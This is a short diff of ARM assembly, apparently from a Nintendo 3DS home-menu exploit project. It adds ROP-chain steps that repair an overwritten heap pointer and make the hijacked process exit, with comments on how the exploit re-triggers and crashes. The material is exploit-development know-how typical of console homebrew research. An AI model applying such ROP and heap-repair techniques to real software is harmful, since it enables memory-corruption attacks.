@@ -19,9 +19,14 @@ ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(3*4), ROP_LOADR4_FROMOBJR0_CALLERFUN
 ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(2*4), 0x1 @ fp value
 ROPMACRO_WRITEWORD BOSSBANNERHAX_SPRETADDR-(1*4), POP_R4R8PC
 
+@ Copy the ptr from <buffer allocated immediately after the decompression outbuf>+0x14 to +0x10. This restores the word overwritten at the end of bossbannerhax_banner.s.
+ROPMACRO_COPYWORD FIXHEAPBUF+0x20224+0x10+0x10, FIXHEAPBUF+0x20224+0x10+0x14
+
 #include "menuhax_loader.s"
 
 @ The ROP used for RET2MENU starts here.
+
+.word MAINLR_SVCEXITPROCESS @ Can't really ret2menu since there's some data that (probably) can't be restored properly. And also the exploit will trigger again the next time the user selects the application icon, which triggers another crash.
 
 ROPMACRO_STACKPIVOT BOSSBANNERHAX_SPRETADDR-(9*4), POP_R4FPPC @ Return to executing the original homemenu code.
 
